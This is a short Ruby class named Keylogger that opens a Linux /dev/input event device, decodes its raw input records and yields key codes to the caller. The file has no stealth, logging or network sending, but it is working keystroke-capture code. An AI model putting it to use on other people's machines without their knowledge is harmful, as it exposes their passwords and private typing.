class Keylogger
  SUPPORTED_PLATFORMS = %w[x86_64-linux x86_64-linux-gnu].freeze
  FORMAT = "l!<l!<HHI!<".freeze

  DeviceNotFoundError = Class.new(StandardError)
  WrongPlatformError = Class.new(StandardError)

  def initialize(name)
    @name = name

    unless SUPPORTED_PLATFORMS.include?(RUBY_PLATFORM)
      raise WrongPlatformError,
        "platform #{RUBY_PLATFORM} not supported"
    end

    raise DeviceNotFoundError unless device
  end

  def listen
    file = File.open("/dev/input/event" + device.event_id, "rb")
    while line = file.read(24)
      value = line.unpack(FORMAT).last

      if value > 0 && value < 59
        yield value
      end
    end
  end

  private

  def device
    @device ||= InputDevices.find_by_name(@name)
  end
end
